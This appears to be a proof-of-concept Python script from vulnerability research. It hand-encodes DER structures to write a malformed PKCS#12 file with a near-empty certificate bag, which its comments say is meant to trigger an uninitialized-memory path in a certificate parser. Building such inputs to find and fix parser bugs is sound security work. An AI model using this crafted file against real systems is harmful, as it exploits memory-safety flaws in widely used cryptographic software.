import struct

def der_encode_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    elif length < 0x10000:
        return bytes([0x82, length >> 8, length & 0xff])
    else:
        raise ValueError("Too long")

def der_sequence(contents):
    return b'\x30' + der_encode_length(len(contents)) + contents

def der_set(contents):
    return b'\x31' + der_encode_length(len(contents)) + contents

def der_oid(oid_str):
    """Encode OID from dotted string"""
    parts = [int(x) for x in oid_str.split('.')]
    encoded = bytes([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        if p == 0:
            encoded += b'\x00'
        else:
            # base-128 encode
            octets = []
            val = p
            octets.append(val & 0x7f)
            val >>= 7
            while val:
                octets.append(0x80 | (val & 0x7f))
                val >>= 7
            encoded += bytes(reversed(octets))
    return b'\x06' + der_encode_length(len(encoded)) + encoded

def der_octet_string(data):
    return b'\x04' + der_encode_length(len(data)) + data

def der_integer(val):
    if val == 0:
        return b'\x02\x01\x00'
    octets = []
    v = val
    while v > 0:
        octets.append(v & 0xff)
        v >>= 8
    octets.reverse()
    if octets[0] & 0x80:
        octets.insert(0, 0)
    return b'\x02' + der_encode_length(len(octets)) + bytes(octets)

def der_explicit(tag, contents):
    return bytes([0xa0 | tag]) + der_encode_length(len(contents)) + contents

# OIDs
DATA_OID = "1.2.840.113549.1.7.1"
CERT_BAG_OID = "1.2.840.113549.1.12.10.1.3"  # certBag
X509_CERT_OID = "1.2.840.113549.1.9.22.1"  # x509Certificate

# Build a minimal PKCS12 file
# PFX ::= SEQUENCE {
#   version INTEGER (v3=3),
#   authSafe ContentInfo,
#   macData MacData OPTIONAL
# }

# ContentInfo ::= SEQUENCE {
#   contentType OBJECT IDENTIFIER,
#   content [0] EXPLICIT ANY DEFINED BY contentType
# }

# AuthenticatedSafe ::= SEQUENCE OF ContentInfo

# SafeContents ::= SEQUENCE OF SafeBag

# SafeBag ::= SEQUENCE {
#   bagId OBJECT IDENTIFIER,
#   bagValue [0] EXPLICIT ANY,
#   bagAttributes SET OF PKCS12Attribute OPTIONAL
# }

# CertBag ::= SEQUENCE {
#   certId OBJECT IDENTIFIER,
#   certValue [0] EXPLICIT ANY
# }

# Create a CertBag with an invalid/minimal certValue
# The certValue should be an OCTET STRING wrapping the cert
# We'll make it a minimal but valid-enough structure to pass DER decoding
# but trigger the uninitialized path

# CertBag: SEQUENCE { certId: x509Certificate OID, certValue: [0] OCTET_STRING "dummy" }
cert_value = der_octet_string(b'\x00')  # minimal cert data
cert_bag = der_sequence(
    der_oid(X509_CERT_OID) +
    der_explicit(0, cert_value)
)

# SafeBag with certBag type
safe_bag = der_sequence(
    der_oid(CERT_BAG_OID) +
    der_explicit(0, cert_bag)
)

# SafeContents
safe_contents = der_sequence(safe_bag)

# ContentInfo for the AuthenticatedSafe (DATA type with SafeContents as OCTET STRING)
content_info = der_sequence(
    der_oid(DATA_OID) +
    der_explicit(0, der_octet_string(safe_contents))
)

# AuthenticatedSafe (SEQUENCE OF ContentInfo)
auth_safe = der_sequence(content_info)

# Now the top-level ContentInfo (authSafe) wrapping the AuthenticatedSafe
auth_safe_content_info_content = der_octet_string(auth_safe)

# PFX structure
pfx = der_sequence(
    der_integer(3) +
    der_sequence(
        der_oid(DATA_OID) +
        der_explicit(0, auth_safe_content_info_content)
    )
)

with open('/workspace/poc1.p12', 'wb') as f:
    f.write(pfx)

print(f"Written {len(pfx)} bytes to /workspace/poc1.p12")
print(f"Hex: {pfx.hex()}")
EOF

